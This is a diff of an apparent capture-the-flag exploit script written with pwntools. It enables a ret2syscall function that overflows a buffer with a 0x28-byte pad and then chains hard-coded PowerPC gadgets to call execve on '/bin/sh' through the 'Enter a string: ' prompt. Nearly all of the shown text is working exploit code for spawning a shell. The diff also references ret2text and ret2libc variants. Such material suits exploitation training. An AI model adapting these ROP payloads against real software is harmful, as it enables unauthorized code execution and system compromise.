@@ -34,21 +34,22 @@ def ret2text():
     if debug_flag: pause()
     ru("\n")
 
-# def ret2syscall():
-#     bin_sh = 0x10000940
-#     stw_3_4_5_lr_blr = 0x100005DC
-#     stw_lr_9_blr = 0x100005F8
-#     sc = 0x10000608
-#     payload = flat([cyclic(0x28), 
-#                 p32(stw_3_4_5_lr_blr), 
-#                 p32(bin_sh), p32(0), p32(0), 
-#                 p32(stw_lr_9_blr), 
-#                 p32(sc), p32(11)])
+def ret2syscall():
+    bin_sh = 0x10000940
+    stw_3_4_5_lr_blr = 0x100005D8
+    stw_0_9_b9 = 0x100005F4
+    sc = 0x10000608
+    payload = flat([cyclic(0x28), 
+                p32(stw_3_4_5_lr_blr), # 2 pad
+                p32(0), p32(stw_3_4_5_lr_blr), 
+                p32(bin_sh), p32(0), p32(0),
+                p32(stw_0_9_b9), 
+                p32(11), p32(sc)])
   
-#     if debug_flag: pause()
-#     sa("Enter a string: ",  payload)
-#     if debug_flag: pause()
-#     ru("\n")
+    if debug_flag: pause()
+    sa("Enter a string: ",  payload)
+    if debug_flag: pause()
+    ru("\n")
 
 # def ret2libc():
 #     printf_plt = elf.plt['printf']
